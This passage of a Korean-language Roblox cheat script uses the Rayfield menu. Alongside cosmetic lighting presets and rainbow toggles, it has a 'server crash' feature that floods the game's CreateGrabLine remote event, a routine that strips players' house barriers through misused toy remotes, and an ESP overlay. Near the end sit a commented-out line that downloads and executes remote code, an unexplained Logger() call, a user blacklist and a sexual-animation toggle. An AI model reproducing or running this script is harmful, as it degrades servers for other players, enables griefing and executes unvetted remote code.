            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(60, 35, 30)
        Lighting.Brightness = 2.0
        Lighting.ColorShift_Bottom = Color3.fromRGB(100, 30, 20)
        Lighting.ColorShift_Top = Color3.fromRGB(240, 100, 50)
        Lighting.EnvironmentDiffuseScale = 0.5
        Lighting.EnvironmentSpecularScale = 0.8
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(80, 45, 35)
        Lighting.ShadowSoftness = 0.15
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 18.5
        Lighting.GeographicLatitude = -20
        Lighting.FogColor = Color3.fromRGB(50, 25, 20)
        Lighting.FogEnd = 15000
        Lighting.FogStart = 500

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://6008860031"
        sky.SkyboxDn = "rbxassetid://6008860471"
        sky.SkyboxFt = "rbxassetid://6008860165"
        sky.SkyboxLf = "rbxassetid://6008860274"
        sky.SkyboxRt = "rbxassetid://6008860381"
        sky.SkyboxUp = "rbxassetid://6008860580"
        sky.StarCount = 1500

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.6
        bloom.Size = 45
        bloom.Threshold = 1.0

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.02
        cc.Contrast = 0.22
        cc.Saturation = 0.4
    end
})

bdTab:CreateButton({
    Name = "🌌 황금빛 스페이스 네불라",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(30, 25, 15)
        Lighting.Brightness = 1.6
        Lighting.ColorShift_Bottom = Color3.fromRGB(50, 40, 20)
        Lighting.ColorShift_Top = Color3.fromRGB(220, 160, 60)
        Lighting.EnvironmentDiffuseScale = 0.6
        Lighting.EnvironmentSpecularScale = 1.0
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(35, 30, 20)
        Lighting.ShadowSoftness = 0.2
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 0
        Lighting.GeographicLatitude = 0
        Lighting.FogColor = Color3.fromRGB(20, 15, 10)
        Lighting.FogEnd = 120000
        Lighting.FogStart = 1000

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://12061405105"
        sky.SkyboxDn = "rbxassetid://12061405785"
        sky.SkyboxFt = "rbxassetid://12061405372"
        sky.SkyboxLf = "rbxassetid://12061405524"
        sky.SkyboxRt = "rbxassetid://12061405625"
        sky.SkyboxUp = "rbxassetid://12061405903"
        sky.StarCount = 8000

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 2.4
        bloom.Size = 55
        bloom.Threshold = 0.5

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.03
        cc.Contrast = 0.28
        cc.Saturation = 0.5
        cc.TintColor = Color3.fromRGB(255, 245, 220)
    end
})

bdTab:CreateButton({
    Name = "❄️ 영원한 겨울의 혹한 오로라",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(15, 25, 35)
        Lighting.Brightness = 0.8
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 30, 50)
        Lighting.ColorShift_Top = Color3.fromRGB(100, 200, 255)
        Lighting.EnvironmentDiffuseScale = 0.5
        Lighting.EnvironmentSpecularScale = 0.8
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(20, 30, 45)
        Lighting.ShadowSoftness = 0.4
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 2.0
        Lighting.GeographicLatitude = 85
        Lighting.FogColor = Color3.fromRGB(8, 15, 25)
        Lighting.FogEnd = 8000
        Lighting.FogStart = 400

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://9243960010"
        sky.SkyboxDn = "rbxassetid://9243960627"
        sky.SkyboxFt = "rbxassetid://9243960167"
        sky.SkyboxLf = "rbxassetid://9243960299"
        sky.SkyboxRt = "rbxassetid://9243960475"
        sky.SkyboxUp = "rbxassetid://9243960765"
        sky.StarCount = 6000

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.6
        bloom.Size = 35
        bloom.Threshold = 0.7

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.02
        cc.Contrast = 0.2
        cc.Saturation = 0.35
        cc.TintColor = Color3.fromRGB(230, 250, 255)
    end
})

bdTab:CreateButton({
    Name = "🌆 스카이라인 애니메이션 노을",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(55, 35, 45)
        Lighting.Brightness = 2.6
        Lighting.ColorShift_Bottom = Color3.fromRGB(120, 40, 80)
        Lighting.ColorShift_Top = Color3.fromRGB(255, 130, 100)
        Lighting.EnvironmentDiffuseScale = 0.6
        Lighting.EnvironmentSpecularScale = 0.7
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(85, 55, 65)
        Lighting.ShadowSoftness = 0.1
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 18.0
        Lighting.GeographicLatitude = 40
        Lighting.FogColor = Color3.fromRGB(210, 130, 140)
        Lighting.FogEnd = 20000
        Lighting.FogStart = 1000

        local atmosphere = Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.3
        atmosphere.Color = Color3.fromRGB(255, 150, 150)
        atmosphere.Decay = Color3.fromRGB(80, 40, 100)
        atmosphere.Glare = 1.5
        atmosphere.Haze = 1.5

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://2612711018"
        sky.SkyboxDn = "rbxassetid://2612712217"
        sky.SkyboxFt = "rbxassetid://2612711311"
        sky.SkyboxLf = "rbxassetid://2612711585"
        sky.SkyboxRt = "rbxassetid://2612711831"
        sky.SkyboxUp = "rbxassetid://2612712521"

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.8
        bloom.Size = 45
        bloom.Threshold = 1.2

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.03
        cc.Contrast = 0.18
        cc.Saturation = 0.5

        local sunrays = Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.2
        sunrays.Spread = 0.75
    end
})

bdTab:CreateButton({
    Name = "🌌 평행 우주의 신비 (사이언스 필드)",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(10, 25, 30)
        Lighting.Brightness = 1.4
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 50, 80)
        Lighting.ColorShift_Top = Color3.fromRGB(0, 200, 255)
        Lighting.EnvironmentDiffuseScale = 0.5
        Lighting.EnvironmentSpecularScale = 1.1
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(15, 30, 40)
        Lighting.ShadowSoftness = 0.25
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 0
        Lighting.GeographicLatitude = -60
        Lighting.FogColor = Color3.fromRGB(4, 12, 20)
        Lighting.FogEnd = 100000
        Lighting.FogStart = 1500

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://12450383177"
        sky.SkyboxDn = "rbxassetid://12450384260"
        sky.SkyboxFt = "rbxassetid://12450383437"
        sky.SkyboxLf = "rbxassetid://12450383636"
        sky.SkyboxRt = "rbxassetid://12450383921"
        sky.SkyboxUp = "rbxassetid://12450384501"
        sky.StarCount = 9999

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 2.0
        bloom.Size = 40
        bloom.Threshold = 0.5

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.02
        cc.Contrast = 0.26
        cc.Saturation = 0.4
        cc.TintColor = Color3.fromRGB(230, 255, 255)
    end
})

bdTab:CreateButton({
    Name = "🌌 딥 스페이스 나이트메어 (암흑 성운)",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(5, 5, 8)
        Lighting.Brightness = 0.6
        Lighting.ColorShift_Bottom = Color3.fromRGB(15, 0, 15)
        Lighting.ColorShift_Top = Color3.fromRGB(40, 10, 40)
        Lighting.EnvironmentDiffuseScale = 0.1
        Lighting.EnvironmentSpecularScale = 0.4
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(8, 5, 12)
        Lighting.ShadowSoftness = 0.6
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 23.5
        Lighting.GeographicLatitude = 45
        Lighting.FogColor = Color3.fromRGB(2, 1, 4)
        Lighting.FogEnd = 40000
        Lighting.FogStart = 2000

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = false
        sky.SkyboxBk = "rbxassetid://152285141"
        sky.SkyboxDn = "rbxassetid://152285108"
        sky.SkyboxFt = "rbxassetid://152285161"
        sky.SkyboxLf = "rbxassetid://152285191"
        sky.SkyboxRt = "rbxassetid://152285122"
        sky.SkyboxUp = "rbxassetid://152285175"
        sky.StarCount = 2000

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.2
        bloom.Size = 30
        bloom.Threshold = 0.9

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = -0.02
        cc.Contrast = 0.35
        cc.Saturation = 0.2
        cc.TintColor = Color3.fromRGB(240, 220, 245)
    end
})
bdTab:CreateSection("이외")
bdTab:CreateToggle({
    Name = "무지개 캐릭터",
    Callback = function(Value)
        _G.RainbowCharacterEnabled = Value
        
        if Value then
            local runService = game:GetService("RunService")
            local players = game:GetService("Players")
            local localPlayer = players.LocalPlayer
            local hue = 0
            
            task.spawn(function()
                while _G.RainbowCharacterEnabled do
                    local deltaTime = runService.Heartbeat:Wait()
                    hue = (hue + deltaTime * 0.1) % 1
                    local rainbowColor = Color3.fromHSV(hue, 1, 1)
                    
                    local character = localPlayer.Character
                    if character then
                        for _, part in ipairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.Color = rainbowColor
                            elseif part:IsA("Accessory") and part:FindFirstChild("Handle") then
                                part.Handle.Color = rainbowColor
                            end
                        end
                    end
                end
            end)
        end
    end
})
bdTab:CreateToggle({
    Name = "초발광 무지개 블롭맨",
    Callback = function(Value)
        _G.RainbowBlobmanEnabled = Value
        
        if Value then
            local runService = game:GetService("RunService")
            local workspace = game:GetService("Workspace")
            local hue = 0
            
            task.spawn(function()
                while _G.RainbowBlobmanEnabled do
                    local deltaTime = runService.Heartbeat:Wait()
                    hue = (hue + deltaTime * 0.1) % 1
                    local rainbowColor = Color3.fromHSV(hue, 1, 1)
                    
                    local blobman = workspace:FindFirstChild("CurrentBlobman", true)
                    if blobman then
                        for _, part in ipairs(blobman:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.Color = rainbowColor
                                part.Material = Enum.Material.Neon
                            end
                        end
                    end
                end
            end)
        end
    end
})

keybindTab:CreateSection("줄")
local antilagDet = keybindTab:CreateInput({
    Name = "줄 감지",
    CurrentValue = 30,
    PlaceholderText = "",
    RemoveTextAfterFocusLost = false,
    Flag = "linesInputFlag",
    Callback = function(Value)
        AntiLagV = Value
    end
})
antilagDet:Set(30)


game:GetService('Players').LocalPlayer.CharacterAdded:Connect(function()
    vu5 = nil
    vu6 = false
end)

keybindTab:CreateSection("Mouse")
keybindTab:CreateKeybind({
    Name = "텔포",
    CurrentKeybind = "Z",
    HoldToInteract = false,
    Flag = "38",
    Callback = tpF
})

local Tper = keybindTab:CreateToggle({
    Name = "3인칭",
    CurrentValue = false,
    Flag = "AutoSitBlobman",
    Callback = function(Value)
        _G.CameraLoopID = (_G.CameraLoopID or 0) + 1
        local currentLoopID = _G.CameraLoopID

        if Value then
            task.spawn(function()
                local character = plr.Character or plr.CharacterAdded:Wait()
                local rootPart = character:WaitForChild("HumanoidRootPart", 5)
                
                plr.CameraMode = Enum.CameraMode.Classic
                task.wait(0.05)
                
                local success = false
                local attempts = 0
                
                while _G.CameraLoopID == currentLoopID and not success and attempts < 80 do
                    plr.CameraMinZoomDistance = 12
                    plr.CameraMaxZoomDistance = 12
                    
                    task.wait(0.05)
                    attempts = attempts + 1
                    
                    if plr:GetAttribute("CameraZoomDistance") == 12 or 
                       (workspace.CurrentCamera and rootPart and (workspace.CurrentCamera.CoordinateFrame.p - rootPart.Position).Magnitude >= 11.5) then
                        success = true
                    end
                end
                
                if _G.CameraLoopID == currentLoopID then
                    plr.CameraMinZoomDistance = 0.5 
                    plr.CameraMaxZoomDistance = 100000 
                end
            end)
        else
            plr.CameraMode = Enum.CameraMode.LockFirstPerson
            plr.CameraMaxZoomDistance = 0.5
            plr.CameraMinZoomDistance = 0.5
        end
    end
})

task.spawn(function()
    if not game:IsLoaded() then game.Loaded:Wait() end
    task.wait(0.3)
    Tper:Set(true)
end)




keybindTab:CreateKeybind({
    Name = "앉기 <font color='rgb(255,0,0)'>[블롭맨]</font>",
    CurrentKeybind = "X",
    HoldToInteract = false,
    Flag = "40",
    Callback = function()
        BlobSit()
    end,
})

plotTab:CreateSection("집")
local BarrierNoclip = plotTab:CreateToggle({
    Name = "집 베리어 삭제",
    CurrentValue = false,
    Flag = "BarrierNoclipToggle",
    Callback = function(Value)
        BarrierCanCollideT = Value
        BarrierCanCollideF()
    end
})
BarrierNoclip:Set(true)

plotTab:CreateButton({
    Name = "집 베리어 완전삭제 | 햄버거",
    Callback = function()
        PlotBarrierDelete()
    end,
})

local isExecuting = false

local function getMyPlot()
    for i = 1, 5 do
        local plot = workspace.Plots:FindFirstChild("Plot" .. i)
        if plot then
            local plotSign = plot:FindFirstChild("PlotSign")
            if plotSign then
                local thisPlotsOwners = plotSign:FindFirstChild("ThisPlotsOwners")
                if thisPlotsOwners then
                    for _, child in ipairs(thisPlotsOwners:GetChildren()) do
                        if child:IsA("StringValue") and child.Value == game.Players.LocalPlayer.Name then
                            return plot.PlotArea
                        end
                    end
                end
            end
        end
    end
end

function PlotBarrierDelete()
if PBDrun then return end
PBDrun = true

local char = plr.Character
if not char then PBDrun = false return end

local hrp = char:FindFirstChild("HumanoidRootPart")
if not hrp then PBDrun = false return end

local metal = workspace.Plots.Plot1.TeslaCoil.Metal
if not metal then PBDrun = false return end

local TP = metal.CFrame
local OCF = hrp.CFrame

task.spawn(function()
rs.MenuToys.SpawnToyRemoteFunction:InvokeServer("FoodHamburger", hrp.CFrame, Vector3.new(0,0,0))
end)

task.wait(0.2)

local foodHamburger = inv:FindFirstChild("FoodHamburger")
if not foodHamburger then PBDrun = false return end

if foodHamburger then
task.spawn(function()
foodHamburger.HoldPart.HoldItemRemoteFunction:InvokeServer(foodHamburger, char)
end)
end

task.wait(0.1)

hrp.CFrame = TP
task.wait(0.17)

if foodHamburger then
rs.MenuToys.DestroyToy:FireServer(foodHamburger)
end

hrp.CFrame = OCF
task.wait(0.4)

PBDrun = false
end


keybindTab:CreateSection("ESP")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

local RunService = game:GetService("RunService")

local PcldViewT = false
local processed = {}
local redBoxes = {}
local descendantConn = nil


function PcldViewF()
    if descendantConn then
        descendantConn:Disconnect()
        descendantConn = nil
        workspace:SetAttribute("PcldViewDescendantConn", false)
    end
    if rainbowConn then
        rainbowConn:Disconnect()
        rainbowConn = nil
    end

    if PcldViewT then

        local function createESP(obj)
            if not processed[obj] then
                local box = Instance.new("SelectionBox")
                box.Adornee = obj
                box.LineThickness = 0.005
                box.SurfaceTransparency = 1
                box.SurfaceColor3 = Color3.fromRGB(255, 255, 255)
                box.Color3 = Color3.fromHSV(0, 1, 1) -- 초기 색상 (빨간색)
                box.Parent = obj
                processed[obj] = true
                redBoxes[obj] = box
            end
        end

        
        for _, obj in ipairs(workspace:GetChildren()) do
            if (obj.Name == "PlayerCharacterLocationDetector" or obj.Name == "me") and obj:IsA("BasePart") then
                createESP(obj)
            end
        end

    
        descendantConn = workspace.DescendantAdded:Connect(function(obj)
            if PcldViewT and (obj.Name == "PlayerCharacterLocationDetector" or obj.Name == "me") and obj:IsA("BasePart") then
                createESP(obj)
            end
        end)

        
        workspace.DescendantRemoving:Connect(function(obj)
            if redBoxes[obj] then
                redBoxes[obj]:Destroy()
                redBoxes[obj] = nil
                processed[obj] = nil
            end
        end)

        
        rainbowConn = RunService.RenderStepped:Connect(function()
            
            local hue = (tick() % 5) / 5 
            local rainbowColor = Color3.fromHSV(hue, 1, 1)

            for obj, box in pairs(redBoxes) do
                if box and box.Parent then
                    box.Color3 = rainbowColor
                else
                    redBoxes[obj] = nil
                    processed[obj] = nil
                end
            end
        end)

    else
                for obj, box in pairs(redBoxes) do
            if box then box:Destroy() end
        end
        redBoxes = {}
        processed = {}
    end
end




local PCLDView = keybindTab:CreateToggle({
    Name = "PCLD 보기",
    CurrentValue = false,
    Flag = "PCLDView",
    Callback = function(Value)
        PcldViewT = Value
        PcldViewF()
    end
})
PCLDView:Set(true)

local ViewTool = keybindTab:CreateToggle({
    Name = "표창,쿠나이 보기",
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        ViewToolT = Value
        ViewToolF()
    end
})
ViewTool:Set(true)




CreditsTab:CreateLabel("누나   <font color='rgb(255,0,0)'>[onwer]</font>", 96897864871400, Color3.fromRGB(255, 255, 255), true)
CreditsTab:CreateParagraph({Title = "0110rim", Content = "착함의 경지"})

CreditsTab:CreateLabel("식호   <font color='rgb(0,255,0)'>[good]</font>", 113854105043977, Color3.fromRGB(255, 255, 255), false)
CreditsTab:CreateParagraph({Title = "매우좋습니다.", Content = "가장좋은방"})

CreditsTab:CreateLabel("알파   <font color='rgb(0,255,255)'>[TOP1 ONWER]</font>", 3572491301, Color3.fromRGB(255, 255, 255), false)
CreditsTab:CreateParagraph({Title = "QRDOOTE1120", Content = "Owner"})

CreditsTab:CreateLabel("부계   <font color='rgb(255,0,0)'>[onwer]</font>", 78390276296494, Color3.fromRGB(255, 255, 255), false)
CreditsTab:CreateParagraph({Title = "AI_AIPACA", Content = "Co-Owner"})


-- ================== 랭크 알림 ==================
Rayfield:Notify({
    Title = "랭크 알림",
    Content = "랭크 배치완료",
    Duration = 6,
    Image = 0
})








 



DDTab:CreateToggle({
    Name = "딸치기   <font color='rgb(25,255,0)'>[자위마스터]</font>",
    CurrentValue = false,
    Flag = "JerkMotionToggle", 
    Callback = function(Value)
        jerkActive = Value

        local player = game:GetService("Players").LocalPlayer
        local character = player.Character
        if not character then return end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end

        local animator = humanoid:FindFirstChildOfClass("Animator")
        if not animator then
            animator = Instance.new("Animator")
            animator.Parent = humanoid
        end

        if jerkActive then
            if not jerkAnimationTrack then
                local animation = Instance.new("Animation")
                animation.AnimationId = "rbxassetid://168268306"
                jerkAnimationTrack = animator:LoadAnimation(animation)
            end

            jerkAnimationTrack:Play()
            task.wait(0.3)

            task.spawn(function()
                while jerkActive and jerkAnimationTrack and jerkAnimationTrack.IsPlaying do
                    jerkAnimationTrack.TimePosition = 0.3
                    task.wait(0.1)
                end
            end)
        else
            if jerkAnimationTrack then
                jerkAnimationTrack:Stop()
            end
        end
    end,
})

--local LineLagT = false
--local LineLagV = 50

function LineLagF()
    task.spawn(function()
        while LineLagT do
            pcall(function()
                local args = {
                    [1] = "Line"
                }
        
                for i = 1, tonumber(LineLagV) do
                    game:GetService("ReplicatedStorage").GrabEvents.CreateGrabLine:FireServer(unpack(args))
                end
            end)
            task.wait() 
        end
    end)
end

lagTab:CreateSection("렉")
lagTab:CreateToggle({
    Name = "렉(섭폭)    <font color='rgb(255,0,0)'>[라인]</font>     <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "lagToggleFlag",
    Callback = function(Value)
        LineLagT = Value
        LineLagF()
    end
})


lagTab:CreateInput({
    Name = "줄",
    CurrentValue = 50,
    PlaceholderText = "Lines",
    RemoveTextAfterFocusLost = false,
    Flag = "linesInputFlag",
    Callback = function(Value)
        LineLagV = Value
    end
})


BlacklistTab:CreateLabel("kvzwx9")
BlacklistTab:CreateLabel("K_SH0619")


---loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/q1"))()
Logger()

 
